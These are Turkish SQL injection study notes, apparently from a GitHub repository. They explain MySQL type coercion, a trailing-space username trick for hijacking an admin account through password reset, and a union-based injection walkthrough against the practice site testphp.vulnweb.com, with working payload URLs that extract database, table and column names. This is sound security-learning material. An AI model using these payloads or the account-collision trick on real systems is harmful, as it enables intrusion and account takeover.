# 0x01
Sql injection notları burada yer almaktadır.
## **SQL Injection nedir?**
Sql injection, saldırganların veri tabanı içeren uygulamalarda kendi sorgularını yazabilmesidir.
## **Veri Tabanı Mantığını Anlamak**
Veri Tabanı Sorguları

Veritabanında "SELECT 1" sorgusunu çalıştırdığımızda verdiği sonuç aşağıdaki gibidir.

![Image](https://github.com/user-attachments/assets/c5d098b7-acec-46d6-830a-900456a2a9b6)

Veritabanında "SELECT 2-1" sorgusunu çalıştırdığımızda aşağıdaki gibi çıkarma işlemi gerçekleşmektedir.

![Image](https://github.com/user-attachments/assets/201e156a-c5de-471b-84d2-5989259b8b5e)

Veritabanında "SELECT 2+1" sorgusunu çalıştırdığımızda aşağıdaki gibi toplama işlemi gerçekleşmektedir.

![Image](https://github.com/user-attachments/assets/eb9d9625-234b-4f59-8239-349e387a083c)

Veritabanında " SELECT '2-1' " sorgusunu çalıştırdığımızda verdiği sonuç aşağıdaki gibidir. Bu sefer çıkarma işlemi gerçekleşmemiştir. Çünkü bu ifade string'tir.

![Image](https://github.com/user-attachments/assets/d4965dc5-c89c-472c-80eb-7e6628225cf9)

Veritabanında " SELECT '2'-'1' " sorgusunu çalıştırdığımızda verdiği sonuç aşağıdaki gibidir. Bu seferki sorgu, '2' ve '1' stringlerini integer'a çevirir ve işlem yapar.

![Image](https://github.com/user-attachments/assets/279243ff-8469-4e10-b342-998e548ae62c)

Veritabanında " SELECT '2'+'1' " sorgusunu çalıştırdığımızda verdiği sonuç aşağıdaki gibidir. Bu seferki sorguda da, '2' ve '1' stringlerini integer'a çevirir ve işlem yapar.

![Image](https://github.com/user-attachments/assets/28eaea1f-36fa-4998-bf99-c85961876fde)

Bu sorguda string ifadeleri integer'a dönüştürülmüştür ama bu sefer 'a' ifadesi bir sayı olmadığı için integer'a dönüştürülürken 0 alınmıştır. Bu da sonucun 2 çıkmasına sebep olur.

![Image](https://github.com/user-attachments/assets/bad2a93c-a3d6-4146-95ad-66335c0f5ce4)

Buradaki stringlerin ikisi de sayı olmadığı için ikisi de integer'a, 0 olacak şekilde dönüştürülür. Bu da 0 sonucunun çıkmasına sebep olur.

![Image](https://github.com/user-attachments/assets/f0719bc3-0cf4-4353-b5c6-b3237ffcb79d)

Aşağıdaki sorguda, stringlerin arasında boşluk bırakmanın concat işlemine denk olduğunu anlamış oluyoruz.

![Image](https://github.com/user-attachments/assets/f35a978f-dbaf-4793-9b92-41ac654c0990)
![Image](https://github.com/user-attachments/assets/92744911-85f6-4dea-833c-720c0ffd0d5b)

Aşağıdaki sorguda da yine concat işlemi gerçekleşmiştir.

![Image](https://github.com/user-attachments/assets/153b4ada-b0e8-4e1f-94d0-ba4ebcadd5f2)

Bu sorgu, stringler integer'a dönüştüğünden ve çıkarma işlemi içerdiğinden işlem gerçekleşmiş ve "20a" çıkmıştır.

![Image](https://github.com/user-attachments/assets/d13660bc-3fe8-4b25-ac0a-b51ae3169cc9)

Bu sorguda "^" ifadesi kullanıldı ve bu ifade xor ifadesidir. Bu da sonucun 3 çıkmasına sebep oluyor.

![Image](https://github.com/user-attachments/assets/e247d99f-4c43-48f8-8450-d8fbe242ee5b)

Bu sorguda xor ifadesi kendi ile aynı ifadeleri 0 yaptığından sonucumuz 0 olmuştur.

![Image](https://github.com/user-attachments/assets/9b8df8b1-d452-4623-a6a3-cffce9b00cc9)

Bu ifademizde 1'in değili döndürülmüştür. Bu yüzden cevap 0'dır.

![Image](https://github.com/user-attachments/assets/3483e13b-2496-4912-89d8-8f168beea651)

SELECT ~1 sorgusunu yazarsak bize maksimum integer input sayısı gelmektedir.

![Image](https://github.com/user-attachments/assets/856a490c-8514-4e6c-a640-2172eeb2efbc)

Veri Tabanı Üzerinde Yaptığım Denemeler

Burada veritabanında yeni bir tablo oluşturduk

```
CREATE TABLE users (
id INT(6) UNSIGNED AUTO_INCREMENT PRIMARY KEY,
firstname VARCHAR(30) NOT NULL,
lastname VARCHAR(30) NOT NULL,
email VARCHAR(50),
reg_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
)
```

Burada tablomuza değer ekliyoruz

```
INSERT INTO users(firstname,lastname) VALUES ('mustafa samed','özşahin')
```

Daha sonra eklenen değeri görmek için aşağıdaki sorguyu yazıyoruz.

```
MariaDB [TEST]> SELECT * from users;
+----+---------------+-----------+-------+---------------------+
| id | firstname     | lastname  | email | reg_date            |
+----+---------------+-----------+-------+---------------------+
|  1 | mustafa samed | özşahin   | NULL  | 2025-06-28 18:35:56 |
+----+---------------+-----------+-------+---------------------+
```

Şimdi ise adımın sonuna boşluklar ekleyerek tabloya ekliyorum.

```
MariaDB [TEST]> INSERT INTO users(firstname,lastname) VALUES ('mustafa samed ','özşahin');
Query OK, 1 row affected (0.006 sec)                                                                                                                               MariaDB [TEST]> INSERT INTO users(firstname,lastname) VALUES ('mustafa samed  ','özşahin');                                                                        Query OK, 1 row affected (0.008 sec)                                                                                                                               MariaDB [TEST]> INSERT INTO users(firstname,lastname) VALUES ('mustafa samed   ','özşahin');                                                                       Query OK, 1 row affected (0.005 sec)                                                                                                                               MariaDB [TEST]> INSERT INTO users(firstname,lastname) VALUES ('mustafa samed    ','özşahin');                                                                      Query OK, 1 row affected (0.006 sec)
```

Ve tabloda firstname sütununda 'mustafa samed' olan kullanıcıları listelediğimde sonuna boşluk eklediklerim de geliyor.

```
SELECT * FROM users WHERE firstname='mustafa samed';
+----+-------------------+-----------+-------+---------------------+                                                                                                                                                                        
| id | firstname         | lastname  | email | reg_date            |                                                                                                                                                                        
+----+-------------------+-----------+-------+---------------------+                                                                                                                                                                        
|  1 | mustafa samed     | özşahin   | NULL  | 2025-06-28 18:35:56 |                                                                                                                                                                        
|  3 | mustafa samed     | özşahin   | NULL  | 2025-06-28 18:50:54 |
|  4 | mustafa samed     | özşahin   | NULL  | 2025-06-28 18:51:27 |
|  5 | mustafa samed     | özşahin   | NULL  | 2025-06-28 18:51:36 |
|  6 | mustafa samed     | özşahin   | NULL  | 2025-06-28 18:51:41 |
+----+-------------------+-----------+-------+---------------------+
```

Veri tabanına mustafa samed isimli bir admin varsa mustafa samed+boşluk diyerek yeni bir kullanıcı oluşturabilirim ve daha sonra şifremi unuttum seçeneği ile veritabanındaki bütün mustafa samed kullanıcılarında aynı işlemi yapabiliriz.

# **1-Union sqli**

## **Pseudo Code**

```
www.x.com/?id=1

MDISEC

====================================

id = request.get('id')

query = "SELECT * FROM haberler WHERE id ="+id

result = db.execute(query)

if result.size() > 0:
  for i in result:
    print(i.title)
else:
  print("haberler yok")
```

Bu web uygulamasında aşağıdaki sorguyu çalıştırdığımı varsayalayım.

```
SELECT * FROM haberler WHERE id=1;
```

Çalışıp çalışmayacağını test etmek için benzer bir sorguyu kendi veri tabanımda deniyorum ve görüyorum ki çalışıyor ve çalışmak için tırnak işaretine ihtiyaç duymuyor.

```
MariaDB [TEST]> SELECT * FROM users WHERE id=1;
+----+---------------+-----------+-------+---------------------+
| id | firstname     | lastname  | email | reg_date            |
+----+---------------+-----------+-------+---------------------+
|  1 | mustafa samed | özşahin   | NULL  | 2025-06-28 18:35:56 |
+----+---------------+-----------+-------+---------------------+
```

```
www.x.com/?id=1

SELECT * FROM haberler WHERE id=1;

<html>
MDISEC
</html>

====================================

www.x.com/?id=2

SELECT * FROM haberler WHERE id=2;

<html>
LUNIZZ
</html>

====================================

www.x.com/?id=2-1

SELECT * FROM haberler WHERE id=2-1;

<html>
MDISEC
</html>

```

Bu sorguyu çalıştırabiliyorsam veri tabanında çıkarma işlemi yapabildiğim anlamına gelir.

```
SELECT * FROM haberler WHERE id=2-1;
```

Sqli da dahil olmak üzere tüm zafiyetlerde dikkat edilmesi gereken 2 husus vardır.

1-Zafiyet tespiti
2-Zafiyet sömürüsü

Eğer id parametresine 1 değerini veriyorsak MDISEC sonucunu site döndürür eğer 2 değerini veriyorsak LUNIZZ sonucunu site döndürür ve bunlar developer tarafından beklenen davranışlardır. Ama eğerki ben id parametresine 2-1 değerini verip id'nin 1 olduğu durum gerçekleşiyorsa bu, benim veri tabanında planladığım davranışı yaptırabildiğim anlamına gelir.

Peki veri tabanına doğrudan erişimim olduğuna göre bunu nasıl sömüreceğim?

Önceki sorgularda id parametresine müdahele edebiliyorum fakat sorgunun önceki kısımlarına müdahele edemiyorum yani o SELECT sorgusu çalışacak. O halde id'den sonraki kısımda UNION'ı kullanarak kendi sorgularımı yazabilirim.

Deneme yapabileceğim web sitesi

http://testphp.vulnweb.com/

Siteye girdikten sonra categories->posters diyorum.

![Image](https://github.com/user-attachments/assets/b41b5d27-44d7-4511-8061-59e9ded42579)

Url kısmındaki cat değerine 2 yazarsam sayfa böyle oluyor.

![Image](https://github.com/user-attachments/assets/59d0ffde-df29-422e-b7ff-3afa165ea1b5)

Şimdi ise 2-1 giriyorum bu da demek oluyor ki veritabanına müdahalede bulunabiliyorum.

![Image](https://github.com/user-attachments/assets/be512677-cb6d-4b2c-b5ab-ba09e536da18)

UNION kullanarak başka bir SELECT sorgusuyla birleştirmeye çalışıyorum ve hata alıyorum çünkü birleştirmeye çalıştığım sorgular farklı sütun sayılarında sahip.

![Image](https://github.com/user-attachments/assets/df14730f-d358-423a-a0fc-454dbec0f449)

Sütun sayıları eşitlenene kadar deneme yapıyorum. cat değerinin 1 olduğu sayfa ile aynı sayfaya geliyorum ama bir farklılık var. Sayfanın sonunda bulunan 7,2,9 rakamları var. Bu rakamlar, benim sorgumdan önceki sorgudaki 7., 2., ve 9. indislerin ekrana yazdırılmasından dolayı gözüküyor. Bu indisleri kullanarak kendi helper fonksiyonlarımı yazdırabilirim.

```
http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%201,2,3,4,5,6,7,8,9,10,11
```

![image](https://github.com/user-attachments/assets/715eb3a5-a0bc-4f70-abf2-fa8569aa92d2)
![image](https://github.com/user-attachments/assets/c91db4f7-c676-4178-90d4-d5eed021d31b)

7. indiste version() fonksiyonunu yazıyorum.

```
http://testphp.vulnweb.com/listproducts.php?cat=1%20union%20select%201,2,3,4,5,6,version(),8,9,10,11
```

![image](https://github.com/user-attachments/assets/a7db5988-32cd-422f-acac-35751cc91d21)

id kısmına -99999 yazdım çünkü böyle bir id'ye sahip kullanıcı yok bu da sayfada sadece bizim istediğimiz değerlerin gözükmesini sağlar.

```
http://testphp.vulnweb.com/listproducts.php?cat=-99999%20union%20select%201,2,3,4,5,6,version(),8,9,10,11
```

![image](https://github.com/user-attachments/assets/196d9a3b-7ac2-419c-ac25-8d6980eb372b)

Şimdi ise database bilgisini almak için url'de değişiklik yapıyorum.

```
http://testphp.vulnweb.com/listproducts.php?cat=-99999%20union%20select%201,2,3,4,5,6,database(),8,9,10,11
```

![image](https://github.com/user-attachments/assets/63aaf41b-7bdc-490f-a7d4-d78a9033ff4c)

SELECT sonrası hangi tablodan veri çekeceğimi ve FROM'dan sonra neler yazabileceğimi bulmam lazım.

Mysql workbench görünümü

![image](https://github.com/user-attachments/assets/272758f2-ec7c-48be-acdb-f4e2f2a3f7af)

Aşağıdaki sorgu tablo isimlerini elde etmemizi sağlar

```
http://testphp.vulnweb.com/listproducts.php?cat=-99999%20union%20select%201,2,3,4,5,6,table_name,8,9,10,11%20from%20information_schema.tables%20where%20table_schema%20=%20database()
```

![image](https://github.com/user-attachments/assets/1f81aa73-dfb7-414b-b6d2-b76635f56e42)

'users' tablosundan veri çekiyorum.

```
http://testphp.vulnweb.com/listproducts.php?cat=-99999%20union%20select%201,2,3,4,5,6,column_name,8,9,10,11%20from%20information_schema.columns%20where%20table_name%20=%20%27users%27
```

![image](https://github.com/user-attachments/assets/ddeba672-4d73-409d-8175-2867d13e108f)
